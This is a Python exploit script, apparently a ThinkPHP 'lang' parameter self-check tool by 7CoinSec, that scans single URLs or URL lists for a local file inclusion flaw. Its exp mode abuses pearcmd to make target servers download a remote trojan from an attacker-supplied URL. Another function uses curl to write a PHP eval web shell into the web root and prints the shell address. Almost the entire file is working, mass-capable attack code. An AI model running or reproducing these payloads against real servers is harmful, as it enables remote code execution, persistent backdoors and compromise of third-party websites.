import optparse
import requests
import os
import random


headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cache-Control': 'max-age=0',
    'Cookie': 'think_lang=zh-cn',
    'Proxy-Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows NT 10.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
}

def singlePoc(url):
    requrl = url+"/index.php?lang=../../../../../public/index"

    try:
        req = requests.get(url=requrl, headers=headers, timeout=10)
        if(req.status_code == 500):
            print(url+"存在该漏洞")
            return "success"
        else:
            print(url+"不存在该漏洞")
    except Exception:
        print(url+"访问时出现错误")


def manyPoc(filepath):
    payload = "/index.php?lang=../../../../../public/index"

    with open(filepath,"r") as f:
        urlList = f.read().splitlines()
        for url in urlList:
            requrl = url + payload
            try:
                req = requests.get(url=requrl, headers=headers, timeout=10)
                if (req.status_code == 500):
                    print(url + "  存在该漏洞")
                    continue
                else:
                    print(url + "  不存在该漏洞")
            except Exception:
                print(url + "  访问时出现错误")


def singleExp(url,remoteUrl):
    payload = "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+install+-R+.+{}".format(remoteUrl)
    requrl = url + payload #漏洞url
    hz = str(remoteUrl).split("/")
    shellUrl = url+"/tmp/pear/download/{}".format(hz[-1]) #webshell-Url
    try:
        req = requests.get(url=requrl, headers=headers, timeout=10)
        shellreq = requests.get(url=shellUrl, headers=headers, timeout=10)
        if shellreq.status_code == 200:
            print("webshell address :",shellUrl)
        else:
            print("write shell fail ｜ {}".format(url))
    except Exception:
        print("Invalid usage")


def manyExp(filepath,remoteUrl):
    payload = "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+install+-R+.+{}".format(remoteUrl)
    hz = str(remoteUrl).split("/")
    with open(filepath,"r") as f:
        urlList = f.read().splitlines()
        for url in urlList:
            requrl = url + payload  # 漏洞url
            shellUrl = url + "/tmp/pear/download/{}".format(hz[-1])  # webshell-Url
            try:
                req = requests.get(url=requrl, headers=headers, timeout=10)
                shellreq = requests.get(url=shellUrl, headers=headers, timeout=10)
                if shellreq.status_code == 200:
                    print("webshell address :", shellUrl)
                else:
                    print("write shell fail ｜ {}".format(url))
            except Exception:
                print("Invalid usage")

def osSingleExp(url):
    sz = "abcdefghijklmnopqrstuvwxyz"
    shellName = str(random.randint(1000,10000)) + sz[random.randint(0,10)]
    payload = "curl {}/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST['cmd']);?>+/var/www/html/public/{}.php".format(url,shellName)
    os.system(payload)
    shellUrl = url+"/"+shellName+".php"
    if requests.get(url=shellUrl, headers=headers, timeout=10).status_code == 200:
        print("webshell address :", shellUrl)
    else:
        print("write shell fail ｜ {}".format(url))

    # os.system()

def osAllExp():
    print("2")


def logo():
    print('''=========================================
______ _____       _        _____           
|____  / ____|    (_)      / ____|          
    / / |     ___  _ _ __ | (___   ___  ___ 
   / /| |    / _ \\| | '_ \\ \\___ \\ / _ \\/ __|
  / / | |___| (_) | | | | |____) |  __/ (__ 
 /_/   \\_____\\___/|_|_| |_|_____/ \\___|\\___|


  ThinkPHP Lang 漏洞自检工具 by 7CoinSec
========================================= ''')


def main():
    logo()

    usage = '"usage:python %prog -u/--url -f/--file ","version = 1.0.1"'
    parse = optparse.OptionParser(usage)
    parse.add_option("-u", "--url", dest="Url", type=str, help="Enter the url to be detected")
    parse.add_option("-f", "--file", dest="FilePath", type=str, help="Enter a list of urls to detect")
    parse.add_option("-c", "--choose", dest="choose", default="poc", type=str, help="Choose poc detection or exp detection")
    parse.add_option("-r", "--remoteurl", dest="remoteUrl", default=None, type=str, help="enter a remote link")
    parse.add_option("-v", help="software version")
    options, args = parse.parse_args()

    if options.choose == "poc":
        if options.Url != None:
            singlePoc(options.Url)
        if options.FilePath != None:
            manyPoc(options.FilePath)

    elif options.choose == "exp":
        if options.Url != None and options.remoteUrl != None:
            singleExp(options.Url, options.remoteUrl)
        elif options.FilePath != None and options.remoteUrl != None:
            manyExp(options.FilePath, options.remoteUrl)
        elif options.Url != None and options.remoteUrl == None:
            osSingleExp(options.Url)
        elif options.FilePath != None and options.remoteUrl == None:
            osAllExp()
        elif options.Url != None:
            print("Please enter the remote Trojan address, example: python3 tp6.py -c exp -u 'http://example.com' -r/--remote \"http://example.com/shell.php\"")
        elif options.FilePath != None:
            print("Please enter the remote Trojan address, example: python3 tp6.py -c exp -f filePath -r/--remote \"http://example.com/shell.php\"")

    else:
        print("Please choose poc detection or exp detection, example: python3 tp6.py -c poc/exp -u 'http://example.com'")




if __name__ == '__main__':
    main()